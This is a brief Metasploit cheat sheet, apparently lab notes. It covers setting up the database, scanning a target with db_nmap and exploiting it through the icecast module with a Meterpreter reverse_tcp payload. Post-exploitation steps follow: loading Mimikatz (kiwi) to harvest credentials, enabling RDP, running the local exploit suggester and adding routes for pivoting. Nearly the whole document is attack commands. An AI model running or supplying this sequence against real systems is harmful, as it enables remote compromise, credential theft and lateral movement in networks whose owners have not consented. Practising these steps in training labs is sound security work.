# Metasploit

## Config

Start PostgreSQL und Metasploit on boot

 ``` sh
update-rc.d postgresql enable
update-rc.d metasploit enable
```

Manuall start

 ``` sh
service postgresql start
service metasploit start
```

## Start msfconsole

Init Metaspoit and start the console

``` sh
msfdb init
msfconsole -h
msfconsole
db_status
```

Add Target

``` sh
db_nmap -sV 10.10.201.217
```

Scan Target

``` sh
hosts
services
vulns
```

## Use Exploit

This is an example using an exploit with Metasploit:

``` sh
search multi/handler
use # exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.9.193.173
set RHOSTS 10.10.201.217
use icecast
run -j
sessions
sessions -i 1
```

Check Machine

``` sh
getprivs
sysinfo
getuid
```

Start Mimikatz

``` sh
load kiwi
```

Try different exploits

``` sh
run post/windows/gather/checkvm
run post/multi/recon/local_exploit_suggester
run post/windows/manage/enable_rdp
```

``` sh
run autoroute -s 10.10.201.217 -n 255.255.255.0
```
